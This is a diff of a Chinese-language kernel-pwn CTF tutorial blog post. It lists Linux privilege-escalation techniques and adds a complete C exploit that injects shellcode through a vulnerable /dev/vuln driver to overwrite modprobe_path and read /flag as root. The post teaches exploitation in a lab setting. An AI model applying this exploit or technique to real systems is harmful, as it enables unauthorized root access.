@@ -21,9 +21,13 @@ title: "Kernel - How2Kernel 0x00: Environment and Basic LPE"
 > - [x] [[kernel-How2Kernel-0x00-Foundation|Environment and Basic LPE]]
 >     - 基础知识
 >     - 一些常见的非预期解
->     - Kernel Shellcode 提权
-> - [ ] [[Kernel-How2Kernel-0x01-ROP|ROP and pt-regs]]
-> - [ ] slub 分配器
+>     - Kernel 提权常见思路
+> - [x] [[Kernel-How2Kernel-0x01-ROP|ROP and pt-regs]]
+>     - 基本 ROP 链的构造
+>     - `pt_regs` 结构体的利用
+>     - ret2dir 与直接映射区
+> - [x] [[Kernel-How2Kernel-0x02-heap-basics|slub 分配器]]
+>     - 内核堆概述
 > - [ ] 跨缓存的溢出与跨页的堆风水
 > - [ ] Buddy System
 >     - PageJack - Page UAF
@@ -370,11 +374,21 @@ int main() {
 
 > [!INFO] 
 > **更新**：近期发现 ctf-wiki 上内核部分有更新，故在博客中也列举多种提权方式，以便日后查阅：
-> - [Change Current Cred](#solution-1-change-current-cred)：直接根据 gs 相对偏移定位 `current_cred` 并写入 0 提权（纯数据攻击）
-> - [Commit Root Cred](#solution-2-commit-root-cred)：`commit_creds(&init_cred)`（常用，但需要控制流劫持，受 CFI 限制）
-> - [篡改全局变量 modprobe_path](#solution-3-change-modprobe_path)：借助 `call_usermodehelper` 以高权限运行程序（常用，但受 `CONFIG_STATIC_USERMODEHELPER` 限制）
-> - 篡改全局变量 poweroff_cmd：借助 `__orderly_poweroff` 以高权限运行程序（较少见，可以视为 `modprobe_path` 的替代）
-> - 篡改 `/etc/passwd` 等文件的 `f_mode` 使其可写：与篡改当前 cred 类似（纯数据攻击）
+> - **篡改当前 Cred**
+>   - 纯数据攻击
+>   - 直接根据 gs 相对偏移定位 `current_cred` 并写入 0 提权
+> - **替换当前 Cred**
+>   - 常用，但需要控制流劫持，受 CFI 限制
+>   - 调用函数 `commit_creds(&init_cred)`
+> - **篡改全局变量 `modprobe_path`**
+>   - 常用，但受 `CONFIG_STATIC_USERMODEHELPER` 限制
+>   - 借助 `call_usermodehelper` 以高权限运行程序
+> - _**篡改全局变量 `poweroff_cmd`**_
+>   - 较少见，可以视为 `modprobe_path` 的替代
+>   - 借助 `__orderly_poweroff` 以高权限运行程序
+> - _**篡改 `/etc/passwd` 等文件的 `f_mode` 使其可写**_
+>   - 纯数据攻击
+>   - 与篡改当前 cred 类似
 
 在我们第一道 kernel Pwn 题的利用部分，先来了解一下内核对进程权限的识别：
 
@@ -568,22 +582,55 @@ entry_SYSCALL_64()
 
 进入 [`call_modprobe` 函数](https://elixir.bootlin.com/linux/v6.11.4/source/kernel/module/kmod.c#L72) 中并以 root 权限运行 `modprobe_path` 程序。
 
-回到题目，原题是开了 `CONFIG_STATIC_USERMODEHELPER` 的，想必出题人也不想被这种全局变量修改秒掉，可以重新编译一份来打。具体利用流程如下：
+回到题目，原题是开了 `CONFIG_STATIC_USERMODEHELPER` 的，想必出题人也不想被这种全局变量修改秒掉，可以重新编译一份来打（注意一定要用相同版本的内核 v6.1.61）。具体利用流程如下：
 
-1. 根据 `__request_module` 定位到 `modprobe_path` 地址偏移为 `0xFFFFFFFF836774E0`；
+1. 根据 `__request_module` 定位到 `modprobe_path` 地址偏移为 `0xFFFFFFFF838774E0`；
 2. 利用漏洞将 `/tmp/a` 写入上述内存空间；
 3. 完成非法魔数程序和利用程序的构造，并赋予执行权限；
-4. 最后执行非法魔数程序，此时系统会以 root 权限运行 `/tmp/a`，获得 flag：
+4. 最后执行非法魔数程序，此时系统会以 root 权限运行 `/tmp/a`，获得 flag。
+
+由于重新编译了内核，偏移需要重新用 ida 查看，最终利用如下：
 
 ```c
-system("echo -ne \"\\xff\\xff\\xff\\xff\" > /tmp/dummy");
-system("echo \"#!/bin/sh\" >> /tmp/a");
-system("echo \"cp /flag /tmp/flag && chmod a+r /tmp/flag\" >> /tmp/a");
-system("chmod +x /tmp/dummy");
-system("chmod +x /tmp/a");
-execve("/tmp/dummy", NULL, NULL);
-system("cat /tmp/flag");
+// author: @eastXueLian
+// usage : eval $buildPhase
+// You can refer to my nix configuration for detailed information.
+
+#include "libLian.h"
+
+int fd;
+
+int main() {
+    fd = open("/dev/vuln", 2);
+
+	/* [BITS 64] */
+	/**/
+	/* mov r14, qword [rsp + 0x20] */
+	/* sub r14, 0xffffffff8142c6d5 */
+	/* mov rdi, r14 */
+	/* add rdi, 0xFFFFFFFF838774E0 */
+	/* mov dword [rdi], 0x706d742f */
+	/* mov dword [rdi + 4], 0x7878782f */
+	/* mov dword [rdi + 8], 0 */
+	/* ret */
+
+    char payload[] = "L\x8bt$ I\x81\xee\xd5\xc6B\x81L\x89\xf7H\x81\xc7\xe0t\x87\x83\xc7\x07/tmp\xc7G\x04/xxx\xc7G\x08\x00\x00\x00\x00\xc3";
+
+    write(fd, payload, 0x100);
+
+    system("echo -ne \"\\xff\\xff\\xff\\xff\" > /tmp/dummy");
+    system("echo \"#!/bin/sh\" >> /tmp/xxx");
+    system("echo \"cp /flag /tmp/flag && chmod a+r /tmp/flag\" >> /tmp/xxx");
+    system("chmod +x /tmp/dummy");
+    system("chmod +x /tmp/xxx");
+    execve("/tmp/dummy", NULL, NULL);
+    system("cat /tmp/flag");
+
+    return 0;
+}
 ```
+
+利用过程中也可以跟着利用链进行调试，以确定每一步都符合期望（笔者就遇到过优化 / 复制粘贴脚本等问题导致得到错误的偏移量）。
 
 类似的全局变量还有很多，例如 `poweroff_cmd`, `uevent_helper`, `ocfs2_hb_ctl_path`, `nfs_cache_getent_prog`, `cltrack_prog` 等，可以到源码中找到对应的利用方法。
 
